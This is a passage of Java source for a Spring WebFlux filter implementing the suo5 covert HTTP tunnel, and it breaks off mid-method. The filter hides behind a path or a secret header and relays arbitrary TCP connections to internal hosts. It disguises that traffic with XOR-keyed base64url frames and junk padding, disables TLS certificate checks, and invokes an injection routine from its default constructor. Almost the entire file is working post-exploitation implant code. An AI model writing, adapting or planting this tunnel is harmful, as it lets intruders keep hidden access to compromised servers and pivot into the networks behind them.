import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;
import reactor.core.publisher.SignalType;
import reactor.core.publisher.Sinks;
import reactor.core.scheduler.Schedulers;
import reactor.netty.Connection;
import reactor.netty.NettyOutbound;
import reactor.netty.tcp.TcpClient;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.Charset;
import java.security.cert.X509Certificate;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.Consumer;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

// suo5 filter for spring webflux, mount path: /suo5
// full / half / classic are supported
public class Suo5WebFluxFilter implements WebFilter, X509TrustManager, HostnameVerifier {

    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final Charset ASCII = Charset.forName("US-ASCII");
    private static final int MAX_LEN = 0x2000000;
    private static final int CLASSIC_READ_MAX = 524288;
    private static final char[] SID_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789".toCharArray();

    private static final byte AC_CREATE = 0;
    private static final byte AC_DATA = 1;
    private static final byte AC_DELETE = 2;
    private static final byte AC_STATUS = 3;
    private static final byte AC_HEARTBEAT = 16;
    private static final byte AC_DIRTY = 17;

    private static final byte M_HANDSHAKE = 0;
    private static final byte M_FULL = 1;
    private static final byte M_HALF = 2;
    private static final byte M_CLASSIC = 3;

    private static final String S_FIRST = "first";
    private static final String S_DONE = "done";
    private static final String S_FRAMES = "frames";
    private static final String S_PENDING = "pending";
    private static final String S_STREAMING = "streaming";
    private static final String S_FIRST_SEEN = "firstSeen";
    private static final String S_CONSUMER = "consumer";

    private static final String T_ID = "id";
    private static final String T_CONN = "conn";
    private static final String T_OUT = "out";
    private static final String T_SINK = "sink";
    private static final String T_LOCK = "lock";
    private static final String T_DIRTY = "dirty";
    private static final String T_END = "end";
    private static final String T_QUEUE = "queue";
    private static final String T_CLOSED = "closed";

    private static final ConcurrentHashMap<String, Object> ctx = new ConcurrentHashMap<String, Object>();
    private static final HashMap<String, Boolean> localAddrs = collectAddr();

    private final String path;
    private final String headerName;
    private final String headerValue;

    public Suo5WebFluxFilter() {
        this("/suo5", null, null);
        inject();
    }

    public Suo5WebFluxFilter(String path) {
        this(path, null, null);
    }

    public Suo5WebFluxFilter(String path, String headerName, String headerValue) {
        this.path = path == null || path.length() == 0 ? "/suo5" : path;
        this.headerName = headerName;
        this.headerValue = headerValue;
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        if (headerName != null && headerValue != null) {
            String v = request.getHeaders().getFirst(headerName);
            if (v == null || !v.contains(headerValue)) {
                return chain.filter(exchange);
            }
        } else {
            String p = request.getURI().getPath();
            if (!p.equals(path) && !p.endsWith(path)) {
                return chain.filter(exchange);
            }
        }

        ServerHttpResponse response = exchange.getResponse();
        HashMap<String, Object> state = newBodyState();
        final byte[][] buf = new byte[][]{new byte[8192]};
        final int[] len = new int[]{0};
        final Consumer<HashMap<String, byte[]>> onFrame = new Consumer<HashMap<String, byte[]>>() {
            public void accept(HashMap<String, byte[]> frame) {
                Suo5WebFluxFilter.onFrame(state, frame);
            }
        };

        request.getBody()
                .subscribeOn(Schedulers.boundedElastic())
                .subscribe(dataBuffer -> {
                    try {
                        int n = dataBuffer.readableByteCount();
                        byte[] chunk = new byte[n];
                        dataBuffer.read(chunk);
                        feed(buf, len, chunk, onFrame);
                    } catch (Throwable e) {
                        error(state, e);
                    } finally {
                        DataBufferUtils.release(dataBuffer);
                    }
                }, err -> error(state, err), () -> done(state).tryEmitEmpty());

        return one(state, S_FIRST).asMono()
                .flatMap(frame -> Mono.defer(() -> dispatch(exchange, frame, state))
                        .subscribeOn(Schedulers.boundedElastic()))
                .onErrorResume(e -> {
                    try {
                        return response.setComplete();
                    } catch (Throwable ignore) {
                        return Mono.empty();
                    }
                });
    }

    private Mono<Void> dispatch(ServerWebExchange exchange, HashMap<String, byte[]> m, HashMap<String, Object> state) {
        ServerHttpResponse response = exchange.getResponse();
        byte[] modeData = m.get("m");
        byte[] actionData = m.get("ac");
        byte[] idData = m.get(T_ID);
        if (actionData == null || actionData.length != 1 || idData == null || idData.length == 0
                || modeData == null || modeData.length != 1) {
            return response.setComplete();
        }
        byte mode = modeData[0];
        switch (mode) {
            case M_HANDSHAKE:
                return processHandshake(exchange, m);
            case M_FULL:
                return processFullStream(exchange, m, state);
            case M_HALF:
            case M_CLASSIC:
                return done(state).asMono()
                        .then(Mono.defer(() -> processBuffered(exchange, mode, state))
                                .subscribeOn(Schedulers.boundedElastic()));
            default:
        }
        return response.setComplete();
    }

    private Mono<Void> processHandshake(ServerWebExchange exchange, HashMap<String, byte[]> m) {
        ServerHttpResponse response = exchange.getResponse();
        String id = new String(m.get(T_ID), UTF8);
        String sid = randomString(16);

        byte[] tplData = m.get("tpl");
        byte[] ctData = m.get("ct");
        if (tplData != null && tplData.length > 0 && ctData != null && ctData.length > 0) {
            String[] parts = new String(tplData, UTF8).split("#data#", 2);
            if (parts.length == 2) {
                ctx.put(sid, new String[]{new String(ctData, UTF8), parts[0], parts[1]});
            } else {
                ctx.put(sid, new String[0]);
            }
        } else {
            ctx.put(sid, new String[0]);
        }

        byte[] jk = m.get("jk");
        if (jk != null && jk.length > 0) {
            int d = 0;
            try {
                d = Integer.parseInt(new String(jk, UTF8));
            } catch (NumberFormatException ignore) {
            }
            if (d < 0) {
                d = 0;
            }
            ctx.put(sid + "_jk", d);
        }

        byte[] redirectData = m.get("r");
        if (redirectData != null && redirectData.length > 0 && !isLocalAddr(new String(redirectData, UTF8))) {
            response.setStatusCode(HttpStatus.FORBIDDEN);
            return response.setComplete();
        }

        byte[] a = m.get("a");
        boolean stream = a != null && a.length > 0 && a[0] == 1;
        byte[] dt = m.get("dt");
        if (dt == null) {
            dt = new byte[0];
        }
        byte[] start = templateStart(response, sid);
        byte[] end = templateEnd(sid);

        if (stream) {
            setBypassHeader(response);
            final Sinks.Many<byte[]> many = Sinks.many().unicast().onBackpressureBuffer();
            final Object lock = new Object();
            final byte[] finalEnd = end;
            emit(many, lock, start);
            emit(many, lock, marshalBase64(newData(id, dt)));
            Schedulers.parallel().schedule(() -> {
                emit(many, lock, marshalBase64(newData(id, sid.getBytes(UTF8))));
                emit(many, lock, finalEnd);
                many.tryEmitComplete();
            }, 2L, TimeUnit.SECONDS);
            return response.writeWith(many.asFlux().map(response.bufferFactory()::wrap));
        }

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        write(out, start);
        write(out, marshalBase64(newData(id, dt)));
        write(out, marshalBase64(newData(id, sid.getBytes(UTF8))));
        write(out, end);
        return writeBytes(response, out.toByteArray());
    }

    private Mono<Void> processBuffered(ServerWebExchange exchange, byte mode, HashMap<String, Object> state) {
        ServerHttpResponse response = exchange.getResponse();
        List<HashMap<String, byte[]>> frames = frames(state);
        if (frames.isEmpty()) {
            return response.setComplete();
        }
        HashMap<String, byte[]> head = frames.get(0);
        byte[] redirectData = head.get("r");
        if (redirectData != null && redirectData.length > 0 && !isLocalAddr(new String(redirectData, UTF8))) {
            return processRedirect(exchange, frames, new String(redirectData, UTF8));
        }
        byte[] sidData = head.get("sid");
        if (sidData == null || sidData.length == 0) {
            response.setStatusCode(HttpStatus.FORBIDDEN);
            return response.setComplete();
        }
        String sid = new String(sidData, UTF8);
        if (!ctx.containsKey(sid)) {
            response.setStatusCode(HttpStatus.FORBIDDEN);
            return response.setComplete();
        }
        int dirty = dirtySize(sid);
        if (mode == M_HALF) {
            return processHalf(exchange.getRequest(), response, frames, sid, dirty);
        }
        return processClassic(exchange.getRequest(), response, frames, sid);
    }

    private Mono<Void> processHalf(ServerHttpRequest request, ServerHttpResponse response,
                                    List<HashMap<String, byte[]>> frames, String sid, int dirty) {
        setBypassHeader(response);
        byte[] start = templateStart(response, sid);
        byte[] end = templateEnd(sid);
        final Sinks.Many<byte[]> many = Sinks.many().unicast().onBackpressureBuffer();
        final Object lock = new Object();
        final AtomicReference<HashMap<String, Object>> tunnelRef =
                new AtomicReference<HashMap<String, Object>>();
        final byte[] finalEnd = end;
        boolean started = false;

        for (HashMap<String, byte[]> m : frames) {
            byte[] ac = m.get("ac");
            byte[] idData = m.get(T_ID);
            if (ac == null || ac.length != 1 || idData == null) {
                continue;
            }
            String id = new String(idData, UTF8);
            byte action = ac[0];
            if (action == AC_CREATE) {
                if (started) {
                    emit(many, lock, marshalBase64(newStatus(id, (byte) 0)), dirty);
                    continue;
                }
                started = true;
                emit(many, lock, start, dirty);
                boolean ok = halfCreate(request, m, id, many, lock, dirty, finalEnd, tunnelRef);
                if (ok) {
                    continue;
                }
                emit(many, lock, marshalBase64(newStatus(id, (byte) 1)), dirty);
                emit(many, lock, finalEnd, dirty);
                many.tryEmitComplete();
                return response.writeWith(many.asFlux().map(response.bufferFactory()::wrap));
            }
            if (action == AC_DATA) {
                if (halfWrite(m, id)) {
                    continue;
                }
                emit(many, lock, marshalBase64(newDel(id)), dirty);
                continue;
            }
            if (action == AC_DELETE) {
                halfDelete(id);
                continue;
            }
            if (action == AC_HEARTBEAT) {
                emit(many, lock, marshalBase64(newHeartbeat(id)), dirty);
            }
        }

        if (!started) {
            emit(many, lock, start, dirty);
            emit(many, lock, finalEnd, dirty);
            many.tryEmitComplete();
        }
        return response.writeWith(many.asFlux()
                .doFinally(new Consumer<SignalType>() {
                    public void accept(SignalType sig) {
                        if (sig == SignalType.CANCEL) {
                            halfDelete(tunnelRef.get());
                        }
                    }
                })
                .map(response.bufferFactory()::wrap));
    }

    private boolean halfCreate(ServerHttpRequest request, HashMap<String, byte[]> m, String id,
                               Sinks.Many<byte[]> many, Object lock, int dirty, byte[] end,
                               AtomicReference<HashMap<String, Object>> tunnelRef) {
        try {
            InetSocketAddress addr = targetAddress(request, m);
            HashMap<String, Object> t = new HashMap<String, Object>();
            t.put(T_ID, id);
            t.put(T_SINK, many);
            t.put(T_LOCK, lock);
            t.put(T_DIRTY, dirty);
            t.put(T_END, end);
            t.put(T_CLOSED, new AtomicBoolean(false));

            TcpClient client = TcpClient.create()
                    .host(addr.getHostString()).port(addr.getPort())
                    .option(io.netty.channel.ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000);
            Connection conn = client.connect().block(Duration.ofSeconds(3));
            if (conn == null) {
                return false;
            }
            t.put(T_CONN, conn);
            t.put(T_OUT, conn.outbound());
            tunnelRef.set(t);
            ctx.put(id, t);

            emit(many, lock, marshalBase64(newStatus(id, (byte) 0)), dirty);
            conn.inbound().receive().asByteArray().subscribe(
                    new Consumer<byte[]>() {
                        public void accept(byte[] bytes) {
                            emitData(t, bytes);
                        }
                    },
                    err -> tunnelClosed(t),
                    () -> tunnelClosed(t));
            conn.onDispose(() -> tunnelClosed(t));
            return true;
        } catch (Throwable e) {
            HashMap<String, Object> t = tunnelRef.get();
            if (t != null) {
                halfDelete(t);
            }
            return false;
        }
    }

    private boolean halfWrite(HashMap<String, byte[]> m, String id) {
        Object o = ctx.get(id);
        if (!(o instanceof HashMap)) {
            return false;
        }
        @SuppressWarnings("unchecked")
        final HashMap<String, Object> t = (HashMap<String, Object>) o;
        Connection conn = (Connection) t.get(T_CONN);
        if (conn == null || conn.isDisposed()) {
            return false;
        }
        byte[] dt = m.get("dt");
        if (dt != null && dt.length > 0) {
            ((NettyOutbound) t.get(T_OUT)).sendByteArray(Mono.just(dt)).then()
                    .subscribe(v -> {
                    }, err -> tunnelClosed(t));
        }
        return true;
    }

    private void halfDelete(String id) {
        Object o = ctx.remove(id);
        if (o instanceof HashMap) {
            @SuppressWarnings("unchecked")
            HashMap<String, Object> t = (HashMap<String, Object>) o;
            disposeTunnel(t);
        }
    }

    private void halfDelete(HashMap<String, Object> t) {
        if (t != null && ctx.remove(t.get(T_ID), t)) {
            disposeTunnel(t);
        }
    }

    private Mono<Void> processClassic(ServerHttpRequest request, ServerHttpResponse response,
                                      List<HashMap<String, byte[]>> frames, String sid) {
        setBypassHeader(response);
        byte[] start = templateStart(response, sid);
        byte[] end = templateEnd(sid);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        write(out, start);

        for (HashMap<String, byte[]> m : frames) {
            byte[] ac = m.get("ac");
            byte[] idData = m.get(T_ID);
            if (ac == null || ac.length != 1 || idData == null) {
                continue;
            }
            String id = new String(idData, UTF8);
            byte action = ac[0];
            try {
                if (action == AC_CREATE) {
                    write(out, classicCreate(request, m, id));
                    continue;
                }
                if (action == AC_DATA) {
                    classicWrite(m, id);
                    write(out, classicRead(id));
                    continue;
                }
                if (action == AC_DELETE) {
                    classicDelete(id);
                }
            } catch (Throwable e) {
                classicDelete(id);
                write(out, marshalBase64(newDel(id)));
            }
        }
        write(out, end);
        return writeBytes(response, out.toByteArray());
    }

    private byte[] classicCreate(ServerHttpRequest request, HashMap<String, byte[]> m, String id) {
        Object existing = ctx.get(id);
        if (existing instanceof HashMap) {
            return marshalBase64(newStatus(id, (byte) 0));
        }
        final HashMap<String, Object> t = new HashMap<String, Object>();
        t.put(T_ID, id);
        t.put(T_QUEUE, new LinkedBlockingQueue<byte[]>(100));
        t.put(T_CLOSED, new AtomicBoolean(false));
        try {
            InetSocketAddress addr = targetAddress(request, m);
            TcpClient client = TcpClient.create()
                    .host(addr.getHostString()).port(addr.getPort())
                    .option(io.netty.channel.ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000);
            Connection conn = client.connect().block(Duration.ofSeconds(3));
            if (conn == null) {
                return marshalBase64(newStatus(id, (byte) 1));
            }
            t.put(T_CONN, conn);
            t.put(T_OUT, conn.outbound());
            ctx.put(id, t);

            @SuppressWarnings("unchecked")
            final BlockingQueue<byte[]> q = (BlockingQueue<byte[]>) t.get(T_QUEUE);
            final AtomicBoolean closed = (AtomicBoolean) t.get(T_CLOSED);
            conn.inbound().receive().asByteArray().subscribe(new Consumer<byte[]>() {
                public void accept(byte[] bytes) {
                    if (!q.offer(bytes)) {
                        closed.set(true);
                        classicDelete(id);
                    }
                }
            }, err -> closed.set(true), () -> closed.set(true));
            conn.onDispose(() -> closed.set(true));
            return marshalBase64(newStatus(id, (byte) 0));
        } catch (Throwable e) {
            disposeTunnel(t);
            return marshalBase64(newStatus(id, (byte) 1));
        }
    }

    private void classicWrite(HashMap<String, byte[]> m, String id) {
        Object o = ctx.get(id);
        if (!(o instanceof HashMap)) {
            throw new IllegalStateException("tunnel not found");
        }
        @SuppressWarnings("unchecked")
        HashMap<String, Object> t = (HashMap<String, Object>) o;
        Connection conn = (Connection) t.get(T_CONN);
        if (conn == null || conn.isDisposed()) {
            return;
        }
        byte[] dt = m.get("dt");
        if (dt != null && dt.length > 0) {
            ((NettyOutbound) t.get(T_OUT)).sendByteArray(Mono.just(dt)).then()
                    .block(Duration.ofSeconds(3));
        }
    }

    @SuppressWarnings("unchecked")
    private byte[] classicRead(String id) {
        Object o = ctx.get(id);
        if (!(o instanceof HashMap)) {
            return marshalBase64(newDel(id));
        }
        HashMap<String, Object> t = (HashMap<String, Object>) o;
        BlockingQueue<byte[]> q = (BlockingQueue<byte[]>) t.get(T_QUEUE);
        AtomicBoolean closed = (AtomicBoolean) t.get(T_CLOSED);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int written = 0;
        byte[] data;
        while ((data = q.poll()) != null) {
            write(out, marshalBase64(newData(id, data)));
            written += data.length;
            if (written >= CLASSIC_READ_MAX) {
                break;
            }
        }
        if (closed.get() && q.isEmpty()) {
            classicDelete(id);
            write(out, marshalBase64(newDel(id)));
        }
        return out.toByteArray();
    }

    private void classicDelete(String id) {
        Object o = ctx.remove(id);
        if (o instanceof HashMap) {
            @SuppressWarnings("unchecked")
            HashMap<String, Object> t = (HashMap<String, Object>) o;
            disposeTunnel(t);
        }
    }

    private Mono<Void> processFullStream(ServerWebExchange exchange, HashMap<String, byte[]> m,
                                         HashMap<String, Object> state) {
        ServerHttpRequest request = exchange.getRequest();
        ServerHttpResponse response = exchange.getResponse();
        String id = new String(m.get(T_ID), UTF8);

        setBypassHeader(response);
        response.getHeaders().setContentType(MediaType.APPLICATION_OCTET_STREAM);

        final Sinks.Many<byte[]> many = Sinks.many().unicast().onBackpressureBuffer();
        final Object lock = new Object();
        final AtomicBoolean sendClose = new AtomicBoolean(true);
        final AtomicBoolean closeSent = new AtomicBoolean(false);
        final AtomicReference<NettyOutbound> outRef = new AtomicReference<NettyOutbound>();
        final String finalId = id;

        Connection conn;
        try {
            InetSocketAddress addr = targetAddress(request, m);
            TcpClient client = TcpClient.create()
                    .host(addr.getHostString()).port(addr.getPort())
                    .option(io.netty.channel.ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000);
            conn = client.connect().block(Duration.ofSeconds(3));
        } catch (Throwable e) {
            conn = null;
        }
        if (conn == null) {
            emit(many, lock, marshalBase64(newStatus(id, (byte) 1)));
            many.tryEmitComplete();
            return response.writeWith(many.asFlux().map(response.bufferFactory()::wrap));
        }

        final Connection c = conn;
        final Runnable onFinish = new Runnable() {
            public void run() {
                if (sendClose.get() && closeSent.compareAndSet(false, true)) {
                    emit(many, lock, marshalBase64(newDel(finalId)));
                }
                many.tryEmitComplete();
            }
        };
        outRef.set(c.outbound());
        emit(many, lock, marshalBase64(newStatus(id, (byte) 0)));
        c.inbound().receive().asByteArray().subscribe(new Consumer<byte[]>() {
            public void accept(byte[] bytes) {
                emit(many, lock, marshalBase64(newData(finalId, bytes)));
            }
        }, err -> {
            c.dispose();
            onFinish.run();
        }, onFinish);
        c.onDispose(() -> onFinish.run());

        startStreaming(state, new Consumer<HashMap<String, byte[]>>() {
            public void accept(HashMap<String, byte[]> frame) {
                byte[] ac = frame.get("ac");
                if (ac == null || ac.length != 1) {
                    return;
                }
                byte action = ac[0];
                if (action == AC_CREATE || action == AC_DELETE) {
                    sendClose.set(false);
                } else if (action == AC_DATA) {
                    byte[] dt = frame.get("dt");
                    NettyOutbound out = outRef.get();
                    if (dt != null && dt.length > 0 && out != null) {
                        out.sendByteArray(Mono.just(dt)).then().subscribe(v -> {
                        }, err -> {
                        });
                    }
                } else if (action == AC_HEARTBEAT) {
                    emit(many, lock, marshalBase64(newHeartbeat(finalId)));
                }
            }
        });

        done(state).asMono().subscribe(v -> {
            c.dispose();
            onFinish.run();
        }, err -> {
            c.dispose();
            onFinish.run();
        });

        return response.writeWith(many.asFlux()
                .doFinally(new Consumer<SignalType>() {
                    public void accept(SignalType sig) {
                        c.dispose();
                    }
                })
                .map(response.bufferFactory()::wrap));
    }

    private Mono<Void> processRedirect(ServerWebExchange exchange, List<HashMap<String, byte[]>> frames, String url) {
        ServerHttpRequest request = exchange.getRequest();
        ServerHttpResponse response = exchange.getResponse();
        final Sinks.Many<byte[]> many = Sinks.many().unicast().onBackpressureBuffer();
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            for (HashMap<String, byte[]> m : frames) {
                HashMap<String, byte[]> copy = new HashMap<String, byte[]>(m);
                copy.remove("r");
                write(out, marshalBase64(copy));
            }
            final byte[] body = out.toByteArray();
            final URL u = new URL(url);
            final HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod(String.valueOf(request.getMethod()));
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(0);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            if (conn instanceof HttpsURLConnection) {
                SSLContext ssl = SSLContext.getInstance("SSL");
                ssl.init(null, new TrustManager[]{this}, null);
                ((HttpsURLConnection) conn).setSSLSocketFactory(ssl.getSocketFactory());
                ((HttpsURLConnection) conn).setHostnameVerifier(this);
            }
            for (String h : request.getHeaders().keySet()) {
                if (h.equalsIgnoreCase("Content-Length") || h.equalsIgnoreCase("Host")
                        || h.equalsIgnoreCase("Connection") || h.equalsIgnoreCase("Content-Encoding")
                        || h.equalsIgnoreCase("Transfer-Encoding")) {
                    continue;
                }
                List<String> vals = request.getHeaders().get(h);
                if (vals == null) {
                    continue;
                }
                for (String v : vals) {
                    conn.addRequestProperty(h, v);
                }
            }
            conn.setRequestProperty("Host", u.getHost());
            conn.setFixedLengthStreamingMode(body.length);
            java.io.OutputStream os = conn.getOutputStream();
            os.write(body);
            os.flush();
            os.close();
            int code = conn.getResponseCode();
            try {
                response.setStatusCode(HttpStatus.valueOf(code));
            } catch (Throwable ignore) {
            }
            final InputStream in = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
            Schedulers.boundedElastic().schedule(() -> {
                    try {
                        if (in != null) {
                            byte[] b = new byte[8192];
                            int n;
                            while ((n = in.read(b)) > 0) {
                                byte[] chunk = new byte[n];
                                System.arraycopy(b, 0, chunk, 0, n);
                                many.tryEmitNext(chunk);
                            }
                        }
                    } catch (Throwable ignore) {
                    } finally {
                        many.tryEmitComplete();
                        conn.disconnect();
                    }
            });
        } catch (Throwable e) {
            many.tryEmitComplete();
        }
        return response.writeWith(many.asFlux().map(response.bufferFactory()::wrap));
    }


    private static HashMap<String, Object> newBodyState() {
        HashMap<String, Object> s = new HashMap<String, Object>();
        s.put(S_FIRST, Sinks.one());
        s.put(S_DONE, Sinks.one());
        s.put(S_FRAMES, Collections.synchronizedList(new ArrayList<HashMap<String, byte[]>>()));
        s.put(S_PENDING, Collections.synchronizedList(new ArrayList<HashMap<String, byte[]>>()));
        s.put(S_STREAMING, new AtomicBoolean(false));
        s.put(S_FIRST_SEEN, new AtomicBoolean(false));
        s.put(S_CONSUMER, new AtomicReference<Consumer<HashMap<String, byte[]>>>());
        return s;
    }

    @SuppressWarnings("unchecked")
    private static Sinks.One<HashMap<String, byte[]>> one(HashMap<String, Object> s, String key) {
        return (Sinks.One<HashMap<String, byte[]>>) (Sinks.One<?>) s.get(key);
    }

    @SuppressWarnings("unchecked")
    private static Sinks.One<Void> done(HashMap<String, Object> s) {
        return (Sinks.One<Void>) (Sinks.One<?>) s.get(S_DONE);
    }

    @SuppressWarnings("unchecked")
    private static List<HashMap<String, byte[]>> frames(HashMap<String, Object> s) {
        return (List<HashMap<String, byte[]>>) (List<?>) s.get(S_FRAMES);
    }

    private static void onFrame(HashMap<String, Object> state, HashMap<String, byte[]> frame) {
        AtomicBoolean firstSeen = (AtomicBoolean) state.get(S_FIRST_SEEN);
        AtomicBoolean streaming = (AtomicBoolean) state.get(S_STREAMING);
        if (firstSeen.compareAndSet(false, true)) {
            byte[] modeData = frame.get("m");
            boolean isFull = modeData != null && modeData.length == 1 && modeData[0] == M_FULL;
            streaming.set(isFull);
            if (!isFull) {
                frames(state).add(frame);
            }
            one(state, S_FIRST).tryEmitValue(frame);
            return;
        }
        if (streaming.get()) {
            @SuppressWarnings("unchecked")
            List<HashMap<String, byte[]>> pending =
                    (List<HashMap<String, byte[]>>) (List<?>) state.get(S_PENDING);
            synchronized (pending) {
                @SuppressWarnings("unchecked")
                Consumer<HashMap<String, byte[]>> consumer =
                        (Consumer<HashMap<String, byte[]>>) ((AtomicReference<?>) state.get(S_CONSUMER)).get();
                if (consumer == null) {
                    pending.add(frame);
                } else {
                    consumer.accept(frame);
                }
            }
        } else {
            frames(state).add(frame);
        }
    }

    private static void startStreaming(HashMap<String, Object> state, Consumer<HashMap<String, byte[]>> consumer) {
        @SuppressWarnings("unchecked")
        List<HashMap<String, byte[]>> pending =
                (List<HashMap<String, byte[]>>) (List<?>) state.get(S_PENDING);
        synchronized (pending) {
            @SuppressWarnings("unchecked")
            AtomicReference<Consumer<HashMap<String, byte[]>>> ref =
                    (AtomicReference<Consumer<HashMap<String, byte[]>>>) state.get(S_CONSUMER);
            ref.set(consumer);
            for (HashMap<String, byte[]> f : pending) {
                consumer.accept(f);
            }
            pending.clear();
        }
    }

    private static void error(HashMap<String, Object> state, Throwable e) {
        one(state, S_FIRST).tryEmitError(e);
        done(state).tryEmitError(e);
    }


    private static void feed(byte[][] buf, int[] len, byte[] chunk, Consumer<HashMap<String, byte[]>> consumer) {
        int n = len[0];
        byte[] b = buf[0];
        if (n + chunk.length > b.length) {
            int cap = b.length;
            while (cap < n + chunk.length) {
                cap <<= 1;
            }
            byte[] nb = new byte[cap];
            System.arraycopy(b, 0, nb, 0, n);
            b = nb;
        }
        System.arraycopy(chunk, 0, b, n, chunk.length);
        n += chunk.length;

        while (n >= 8) {
            int dataLen;
            try {
                dataLen = frameDataLength(b);
            } catch (Throwable e) {
                throw new IllegalStateException("invalid frame header", e);
            }
            if (dataLen < 0 || dataLen > MAX_LEN) {
                throw new IllegalStateException("invalid frame length " + dataLen);
            }
            if (n < 8 + dataLen) {
                break;
            }
            HashMap<String, byte[]> frame;
            try {
                frame = decodeFrame(b, dataLen);
            } catch (Throwable e) {
                throw new IllegalStateException("invalid frame", e);
            }
            consumer.accept(frame);

            int consumed = 8 + dataLen;
            System.arraycopy(b, consumed, b, 0, n - consumed);
            n -= consumed;
        }
        buf[0] = b;
        len[0] = n;
    }

    private static int frameDataLength(byte[] b) {
        byte[] hdr = decodeBase64Url(b, 0, 8);
        if (hdr.length != 6) {
            throw new IllegalStateException("invalid header length");
        }
        int o0 = hdr[0] & 0xff;
        int o1 = hdr[1] & 0xff;
        int n = ((hdr[2] ^ o0) & 0xff) << 24 | ((hdr[3] ^ o1) & 0xff) << 16
                | ((hdr[4] ^ o0) & 0xff) << 8 | (hdr[5] ^ o1) & 0xff;
        if (n < 0) {
            throw new IllegalStateException("invalid frame length");
        }
        return n;
    }

    private static HashMap<String, byte[]> decodeFrame(byte[] b, int dataLen) {
        byte[] hdr = decodeBase64Url(b, 0, 8);
        int o0 = hdr[0] & 0xff;
        int o1 = hdr[1] & 0xff;
        byte[] body = decodeBase64Url(b, 8, dataLen);
        for (int i = 0; i < body.length; i++) {
            body[i] = (byte) (body[i] ^ (i % 2 == 0 ? o0 : o1));
        }
        return unmarshal(body);
    }

    private static HashMap<String, byte[]> unmarshal(byte[] bs) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        int i = 0;
        while (i < bs.length) {
            int kLen = bs[i++] & 0xff;
            if (i + kLen > bs.length) {
                throw new IllegalStateException("key length error");
            }
            String key = new String(bs, i, kLen, UTF8);
            i += kLen;
            if (i + 4 > bs.length) {
                throw new IllegalStateException("value length error");
            }
            int vLen = (bs[i] & 0xff) << 24 | (bs[i + 1] & 0xff) << 16
                    | (bs[i + 2] & 0xff) << 8 | bs[i + 3] & 0xff;
            i += 4;
            if (vLen < 0 || i + vLen > bs.length) {
                throw new IllegalStateException("value error");
            }
            byte[] v = new byte[vLen];
            System.arraycopy(bs, i, v, 0, vLen);
            i += vLen;
            m.put(key, v);
        }
        return m;
    }

    private static byte[] marshalBase64(HashMap<String, byte[]> m) {
        Random random = new Random();
        int junkSize = random.nextInt(32);
        if (junkSize > 0) {
            byte[] junk = new byte[junkSize];
            random.nextBytes(junk);
            m.put("_", junk);
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (Map.Entry<String, byte[]> e : m.entrySet()) {
            byte[] k = e.getKey().getBytes(UTF8);
            byte[] v = e.getValue();
            out.write(k.length);
            out.write(k, 0, k.length);
            writeU32(out, v.length);
            out.write(v, 0, v.length);
        }
        byte[] data = out.toByteArray();
        byte k0 = (byte) (random.nextInt(255) + 1);
        byte k1 = (byte) (random.nextInt(255) + 1);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ (i % 2 == 0 ? k0 : k1));
        }
        byte[] body = encodeBase64Url(data);
        byte[] hdr = new byte[]{
                k0, k1,
                (byte) (body.length >> 24 ^ k0),
                (byte) (body.length >> 16 ^ k1),
                (byte) (body.length >> 8 ^ k0),
                (byte) (body.length ^ k1)
        };
        byte[] head = encodeBase64Url(hdr);
        byte[] merged = new byte[head.length + body.length];
        System.arraycopy(head, 0, merged, 0, head.length);
        System.arraycopy(body, 0, merged, head.length, body.length);
        return merged;
    }

    private static byte[] encodeBase64Url(byte[] b) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(b).getBytes(ASCII);
    }

    private static byte[] decodeBase64Url(byte[] b, int off, int len) {
        byte[] slice = new byte[len];
        System.arraycopy(b, off, slice, 0, len);
        return Base64.getUrlDecoder().decode(new String(slice, ASCII));
    }

    private static void writeU32(ByteArrayOutputStream out, int n) {
        out.write(n >> 24 & 0xFF);
        out.write(n >> 16 & 0xFF);
        out.write(n >> 8 & 0xFF);
        out.write(n & 0xFF);
    }

    private static HashMap<String, byte[]> newData(String id, byte[] dt) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{AC_DATA});
        m.put("dt", dt);
        m.put(T_ID, id.getBytes(UTF8));
        return m;
    }

    private static HashMap<String, byte[]> newDel(String id) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{AC_DELETE});
